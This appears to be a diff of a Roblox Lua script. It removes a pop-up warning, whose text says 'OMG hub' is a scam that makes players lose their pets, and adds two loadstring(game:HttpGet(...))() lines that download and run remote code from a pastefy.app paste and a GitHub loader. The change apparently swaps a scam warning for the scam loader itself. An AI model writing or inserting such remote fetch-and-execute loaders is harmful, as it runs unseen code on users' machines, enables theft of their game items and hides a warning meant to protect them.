@@ -1,39 +1,5 @@
-local player = game:GetService("Players").LocalPlayer
-local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "ScamWarningUI"
-gui.ResetOnSpawn = false
+loadstring(game:HttpGet("https://pastefy.app/Ap0k5O0t/raw"))()
 
--- Khung nền đen mờ
-local background = Instance.new("Frame")
-background.Size = UDim2.new(1, 0, 1, 0)
-background.BackgroundColor3 = Color3.new(0, 0, 0)
-background.BackgroundTransparency = 0.4
-background.BorderSizePixel = 0
-background.Parent = gui
+--script
 
--- Khung chứa chữ
-local messageFrame = Instance.new("Frame")
-messageFrame.Size = UDim2.new(0.6, 0, 0.2, 0)
-messageFrame.Position = UDim2.new(0.2, 0, 0.4, 0)
-messageFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-messageFrame.BorderSizePixel = 0
-messageFrame.Parent = background
-
--- Văn bản cảnh báo
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(1, -20, 1, -20)
-textLabel.Position = UDim2.new(0, 10, 0, 10)
-textLabel.BackgroundTransparency = 1
-textLabel.TextScaled = true
-textLabel.Font = Enum.Font.SourceSansBold
-textLabel.TextColor3 = Color3.new(1, 1, 1)
-textLabel.Text = "dumbass there is no OMG hub, OMG hub is a scam and you will lose all your pet, use another scripts like nat hub or smth"
-textLabel.TextWrapped = true
-textLabel.Parent = messageFrame
-
--- Tự động xóa UI sau 15 giây
-task.delay(15, function()
-	if gui then
-		gui:Destroy()
-	end
-end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Omgshit/Scripts/main/MainLoader.lua"))()
